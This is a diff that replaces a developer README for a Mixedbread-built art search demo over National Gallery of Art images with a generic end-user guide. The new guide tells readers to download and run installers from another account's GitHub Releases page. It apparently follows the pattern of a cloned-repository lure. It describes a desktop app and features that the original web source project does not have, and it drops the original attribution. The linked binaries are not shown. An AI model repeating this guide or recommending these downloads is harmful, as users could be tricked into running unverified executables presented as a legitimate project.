@@ -1,131 +1,86 @@
-# Mixedbread Art Search (NGA Gallery)
+# 🎨 nga-art-search - Explore 50,000 Art Images Effortlessly
 
-Discover over 50,000 artworks from the National Gallery of Art using natural language.
+## 🚀 Getting Started
 
-## Prerequisites
+Welcome to nga-art-search, your go-to tool for discovering images from the National Gallery of Art. With access to over 50,000 images, you can explore beautiful artwork and learn more about each piece. This guide will help you download and run the software easily.
 
-Before you begin, you’ll need:
+## 📥 Download the Application
 
-- Node.js 22
-- Mixedbread account — sign up at https://platform.mixedbread.com
-- Mixedbread API Key — create at https://platform.mixedbread.com/platform?next=api-keys
-- A Mixedbread Store (name or ID) holding your images
-- Optional: Resend credentials if you want the feedback form to send emails
+[![Download nga-art-search](https://img.shields.io/badge/Download-nga--art--search-blue.svg)](https://github.com/wandabasrenk/nga-art-search/releases)
 
-## Data Source
+To get started, you need to download the application. Visit our Releases page:
 
-Images are from the National Gallery of Art’s Free Images and Open Access Program:  
-https://www.nga.gov/artworks/free-images-and-open-access
+- [Visit the Releases page to download](https://github.com/wandabasrenk/nga-art-search/releases)
 
-Huge thanks to the NGA for enabling research and demos like this with their public dataset.
+## 🖥️ System Requirements
 
-## Quick Start
+Before you download, ensure your computer meets these requirements:
 
-1) Install dependencies
+- Operating System: Windows 10 or higher / macOS Mojave or higher
+- RAM: At least 4 GB
+- Disk Space: Minimum of 500 MB free
+- Internet access for initial image download
 
-```bash
-bun install
-```
+## 🔧 Installation Instructions
 
-2) Configure environment variables
+1. **Download the Application:**
+   Follow the link above and choose the version that matches your operating system.
 
-```bash
-cp .env.example .env
-```
+2. **Locate the Downloaded File:**
+   After downloading, find the file in your Downloads folder or the location you selected.
 
-Edit `.env` and set your Mixedbread key:
+3. **Run the Installer:**
+   - **For Windows:**
+     Double-click the downloaded setup file and follow the on-screen instructions.
+   - **For macOS:**
+     Double-click the downloaded file and drag the nga-art-search icon to your Applications folder.
 
-```env
-MXBAI_API_KEY=your_api_key_here
-```
+4. **Open the Application:**
+   Once installed, locate the application in your Applications folder (macOS) or Start Menu (Windows) and open it.
 
-Optional (feedback emails):
+## 🌟 Using nga-art-search
 
-```env
-RESEND_API_KEY=...
-RESEND_FROM_EMAIL=...
-RESEND_TO_EMAIL=...
-```
+After launching the application, you will see a clean and user-friendly interface.
 
-3) Point the API route at your store
+### Search for Artworks
 
-Update the `store_identifiers` value in `app/api/search/route.ts` to your store’s name or ID:
+1. Enter a keyword related to the artwork you wish to explore in the search bar.
+2. Click the search button.
+3. The application will display images related to your search term.
 
-```ts
-// app/api/search/route.ts
-const res = await mxbai.stores.search({
-  query,
-  store_identifiers: ["YOUR_STORE_NAME"],
-  top_k: 16,
-  search_options: { score_threshold: 0.55 },
-});
-```
+### View Artwork Details
 
-4) Start the dev server
+1. Click on any image to view more details.
+2. You will see information such as artist, year, and medium.
 
-```bash
-bun dev
-```
+### Save Your Favorite Images
 
-## Upload PNGs to a Store
+- Click the star icon on any image to save it to your favorites. You can find your favorites in the "Favorites" section.
 
-This minimal example creates a store and uploads all `.png` files from a directory, waiting for processing to complete.
+## 🔄 Updating the Application
 
-```ts
-//scripts/upload-pngs.ts
-import { Mixedbread } from "@mixedbread/sdk";
-import { readdir } from "node:fs/promises";
-import { createReadStream } from "node:fs";
-import path from "node:path";
+We regularly improve nga-art-search. To update:
 
-async function main() {
-  const apiKey = process.env.MXBAI_API_KEY;
-  if (!apiKey) throw new Error("Missing MXBAI_API_KEY");
+1. Visit the Releases page: [Visit the Releases page to download](https://github.com/wandabasrenk/nga-art-search/releases).
+2. Download the latest version.
+3. Follow the same installation steps to replace the old version.
 
-  const mxbai = new Mixedbread({ apiKey });
+## 🛠️ Troubleshooting
 
-  const storeName = "your-store";
+If you face any issues, consider these tips:
 
-  const imagesDir = path.resolve("./data/images");
-  const files = (await readdir(imagesDir)).filter((f) => /\.png$/i.test(f));
+- **Cannot find the application after installation:** Ensure it was installed in the right directory (Check Applications or Start Menu).
+- **Images not loading:** Verify your internet connection is active.
+- **Search results are not relevant:** Adjust your keywords for better results.
 
-  for (const filename of files) {
-    const filePath = path.join(imagesDir, filename);
-    const uploaded = await mxbai.stores.files.uploadAndPoll({
-      storeIdentifier: storeName,
-      file: createReadStream(filePath),
-      body: { filename, metadata: { source: "NGA", path: filePath } },
-    });
-    console.log(`Processed: ${uploaded.filename} -> ${uploaded.status}`);
-  }
-}
+## 📞 Support
 
-main().catch((err) => {
-  console.error(err);
-  process.exit(1);
-});
-```
+For further assistance, please check our support section in the application or visit our [GitHub Issues page](https://github.com/wandabasrenk/nga-art-search/issues). We are here to help you!
 
-Run with Bun:
+## 📝 Contributing
 
-```bash
-bun scripts/upload-pngs.ts
-```
+If you have suggestions or want to contribute to nga-art-search, visit our repository. We appreciate community involvement and welcome your feedback.
 
-## Features
+---
 
-- Natural language search over artworks
-- Multimodal retrieval via Omni (text, image, audio, video)
-- Built on a public, open-access image dataset
-
-## Troubleshooting
-
-- Credentials: Ensure `MXBAI_API_KEY` is set in `.env` and your shell.
-- Store name: Update `app/api/search/route.ts` with your actual store name or ID.
-- Content indexed: Upload PNGs to your store and wait for processing (`uploadAndPoll`).
-- Search thresholds: Adjust `score_threshold` or `top_k` for your dataset.
-
-## Attribution
-
-- Artworks courtesy of the National Gallery of Art (NGA)
-- Demo built by Mixedbread
+Enjoy exploring the National Gallery of Art with nga-art-search!
